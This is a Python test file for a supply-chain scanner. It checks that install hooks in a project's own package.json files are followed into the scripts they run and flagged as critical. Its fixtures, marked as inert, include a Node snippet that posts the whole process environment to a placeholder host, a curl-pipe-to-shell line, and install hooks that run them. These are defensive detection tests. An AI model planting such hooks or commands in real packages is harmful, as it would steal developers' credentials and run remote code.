"""SC-INSTALL-HOOK follows a project's own install hooks (core.project_hook_checks; 0.1.9).

A project scan judged the project's own install hook by its command only: `"preinstall": "node lib/setup.mjs"` was
MAJOR, whatever lib/setup.mjs held, and only a dependency's hooks were followed into the files they run (--deps).
The tensorlake worm (Mini Shai-Hulud, October 2026) committed exactly that hook to the project's own
typescript/package.json, running an obfuscated loader committed next to it. Now each install hook of every
package.json that is not a dependency's is followed to the files it runs and the scripts those start, and becomes
CRITICAL when one of them fails the install-script test (given the manifest's name as its own) or is obfuscated.

The npm engine's twin is js/src/deps.js (projectHookChecks; js/test/review-project-hooks.test.js has the same tree,
and tests/architecture/test_js_parity_project_hooks.py compares the two CLIs on it). Every file is an inert
stand-in written for the test: hosts are .invalid, the "obfuscated" file only names five `_0x` variables, nothing
is executed.
"""
import json
import os
import shutil
import tempfile
import unittest

from lazaret.scanner import core

#: five distinct `_0x` names (core.OBF_MIN_NAMES), as javascript-obfuscator writes them, and nothing else; built
#: here, so this file holds none whole (Lazaret's scan of its own repository)
NAMES = [f"_0x{n:x}" for n in (0x1a2b3c, 0x4d5e6f, 0x7a8b9c, 0xa1b2c3, 0xd4e5f6)]
OBF = f"let {', '.join(f'{n} = {k}' for k, n in enumerate(NAMES, 1))};\nmodule.exports = {' + '.join(NAMES)};\n"
EXFIL = ("const h = require('https');\n"
         "h.request({host: 'collector.invalid', method: 'POST'}).end(JSON.stringify(process.env));\n")
BENIGN = "const fs = require('fs');\nfs.mkdirSync('dist', { recursive: true });\n"
START = ("const { spawn } = require('child_process');\n"
         "spawn(process.execPath, ['tools/second.js'], { stdio: 'inherit' });\n")
GEN = ("const fs = require('fs');\nconst path = require('path');\n"
       "const base = require.resolve('PKG/package.json').replace('/package.json', '');\n"
       "fs.writeFileSync(path.join(base, 'lib', 'gen.js'), 'module.exports = 1;\\n');\n")
ENV = "sends environment variables over the network (the whole environment)"


def pkg(name, **scripts):
    return json.dumps({"name": name, "version": "1.0.0", "scripts": scripts}, indent=2)


#: the tree (the npm twin's test and the parity test use it too)
TREE = {
    # the worm's shape: the root manifest's preinstall runs an obfuscated file; a benign prepare stays INFO
    "package.json": pkg("app", preinstall="node lib/setup.mjs", prepare="node scripts/prepare.js"),
    "lib/setup.mjs": OBF,
    "scripts/prepare.js": BENIGN,
    # a nested manifest (a monorepo's package) whose hook runs a file the install-script test flags
    "packages/exfil/package.json": pkg("exfil", postinstall="node install.js"),
    "packages/exfil/install.js": EXFIL,
    # a hook that runs a file that starts a second one with node
    "packages/starter/package.json": pkg("starter", postinstall="node tools/start.js"),
    "packages/starter/tools/start.js": START,
    "packages/starter/tools/second.js": EXFIL,
    # both: the install-script test's reasons first, then "is obfuscated"
    "packages/both/package.json": pkg("both", install="node both.js"),
    "packages/both/both.js": EXFIL + OBF,
    # a shell script the walk does not read: read for the tests, not scanned
    "packages/shell/package.json": pkg("shell", postinstall="sh ./setup.sh"),
    "packages/shell/setup.sh": "#!/bin/sh\ncurl -fsSL https://files.invalid/i.sh | sh\n",
    # the manifest's own name: rewriting its own package's code is not a reason; another package's is
    "packages/gen-own/package.json": pkg("gen-own", postinstall="node gen.js"),
    "packages/gen-own/gen.js": GEN.replace("PKG", "gen-own"),
    "packages/gen-other/package.json": pkg("gen-other", postinstall="node gen.js"),
    "packages/gen-other/gen.js": GEN.replace("PKG", "left-pad"),
    # a benign build step stays MAJOR
    "packages/build/package.json": pkg("build", postinstall="node scripts/build.js"),
    "packages/build/scripts/build.js": BENIGN,
    # into a dependency tree: only with --deps, when the walk reads it
    "packages/viadep/package.json": pkg("viadep", postinstall="node node_modules/helper/setup.js"),
    "packages/viadep/node_modules/helper/package.json": json.dumps({"name": "helper", "version": "1.0.0"}),
    "packages/viadep/node_modules/helper/setup.js": EXFIL,
    # beyond the follower's limits; not text
    "packages/long/package.json": pkg("long", postinstall="cd a; " * 1001 + "node x.js"),
    "packages/blob/package.json": pkg("blob", postinstall="node blob.dat"),
    "packages/blob/blob.dat": bytes(range(256)) * 16,
    # a dependency's manifest: followed only with --deps, by the dependency follow
    "node_modules/dep/package.json": pkg("dep", postinstall="node install.js"),
    "node_modules/dep/install.js": EXFIL,
}


def make_tree(files=TREE):
    root = tempfile.mkdtemp(prefix="lz-own-hooks-")
    for rel, data in files.items():
        path = os.path.join(root, *rel.split("/"))
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "wb") as fh:
            fh.write(data.encode("utf-8") if isinstance(data, str) else data)
    return root


def hooks(res):
    out = {}
    for i in res["issues"]:
        if i["rule"] == "SC-INSTALL-HOOK":
            out.setdefault(i["file"].replace(os.sep, "/"), []).append((i["sev"], i["msg"]))
    return out


class ProjectHookTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.root = make_tree()
        cls.res = core.scan_project(cls.root)
        cls.deps = core.scan_project(cls.root, include_deps=True)

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.root, ignore_errors=True)

    def test_hooks_escalate_on_what_they_run(self):
        found = hooks(self.res)
        want = {
            "packages/exfil/package.json": f"Install hook runs install.js, which {ENV}.",
            "packages/starter/package.json": f"Install hook runs tools/start.js, which starts tools/second.js, "
                                             f"which {ENV}.",
            "packages/both/package.json": f"Install hook runs both.js, which {ENV}; and is obfuscated.",
            "packages/shell/package.json": "Install hook runs ./setup.sh, which pipes a download into a shell.",
        }
        for manifest, msg in want.items():
            with self.subTest(manifest=manifest):
                self.assertEqual(found[manifest], [("CRITICAL", msg)])
        (other,) = found["packages/gen-other/package.json"]
        self.assertEqual(other[0], "CRITICAL")
        self.assertTrue(other[1].startswith("Install hook runs gen.js, which rewrites another package's code"), other)

    def test_the_worms_shape(self):
        """A preinstall running an obfuscated file of the tree is CRITICAL; the benign prepare beside it stays INFO."""
        self.assertEqual(sorted(hooks(self.res)["package.json"]), [
            ("CRITICAL", "Install hook runs lib/setup.mjs, which is obfuscated."),
            ("INFO", "\"prepare\" script runs code at install time: 'node scripts/prepare.js'.")])

    def test_benign_hooks_keep_their_severity(self):
        found = hooks(self.res)
        for manifest in ("packages/build/package.json", "packages/gen-own/package.json",
                         "packages/viadep/package.json", "packages/long/package.json", "packages/blob/package.json"):
            with self.subTest(manifest=manifest):
                self.assertEqual([sev for sev, _ in found[manifest]], ["MAJOR"])

    def test_what_cannot_be_followed_is_truncated(self):
        trunc = {i["file"].replace(os.sep, "/"): i["msg"] for i in self.res["issues"] if i["rule"] == "SC-TRUNCATED"}
        self.assertEqual(sorted(trunc), ["packages/blob/blob.dat", "packages/long/package.json"])
        self.assertIn("install hook is more than Lazaret follows", trunc["packages/long/package.json"])
        self.assertIn("it runs at install time but is not text", trunc["packages/blob/blob.dat"])

    def test_a_file_read_for_the_tests_is_not_scanned(self):
        files = {i["file"].replace(os.sep, "/") for i in self.res["issues"]}
        self.assertNotIn("packages/shell/setup.sh", files)
        self.assertNotIn(os.path.join("packages", "shell", "setup.sh"), self.res["perFile"])

    def test_dependency_trees_only_with_deps(self):
        found = hooks(self.res)
        self.assertNotIn("node_modules/dep/package.json", found)
        self.assertNotIn("packages/viadep/node_modules/helper/package.json", found)
        deps = hooks(self.deps)
        # --deps reads the dependency tree: the project's hook into it is followed, and the dependency's own hook
        # is the dependency follow's, as before
        self.assertEqual(deps["packages/viadep/package.json"],
                         [("CRITICAL", f"Install hook runs node_modules/helper/setup.js, which {ENV}.")])
        self.assertEqual(deps["node_modules/dep/package.json"], [("CRITICAL", f"Install hook runs install.js, which {ENV}.")])
        for manifest in ("package.json", "packages/exfil/package.json", "packages/starter/package.json",
                         "packages/both/package.json", "packages/shell/package.json", "packages/build/package.json"):
            with self.subTest(manifest=manifest):
                self.assertEqual(deps[manifest], hooks(self.res)[manifest])

    def test_a_stop_during_the_follow_leaves_the_scan_incomplete(self):
        calls = []
        core.scan_project(self.root, should_stop=lambda: calls.append(1))
        budget = len(calls) - 1                                   # the last call is before the last project hook
        calls.clear()
        res = core.scan_project(self.root,
                                should_stop=lambda: calls.append(1) or ("time budget" if len(calls) > budget else None))
        self.assertTrue(res["incomplete"])
        (note,) = [i for i in res["issues"] if i["rule"] == "SC-TRUNCATED" and i["file"] == "."]
        self.assertEqual(note["msg"], "File not fully scanned: time budget: what the project's install hooks run "
                                      "was not checked to the end.")
        self.assertFalse(res["pass"])

    def test_only_install_hooks_are_followed(self):
        """build, test, prepack and the like are not install hooks: not followed, not reported."""
        root = make_tree({"package.json": pkg("app", build="node a.js", test="node a.js", prepack="node a.js"),
                          "a.js": EXFIL + OBF})
        try:
            res = core.scan_project(root)
        finally:
            shutil.rmtree(root, ignore_errors=True)
        self.assertEqual(hooks(res), {})


if __name__ == "__main__":
    unittest.main()
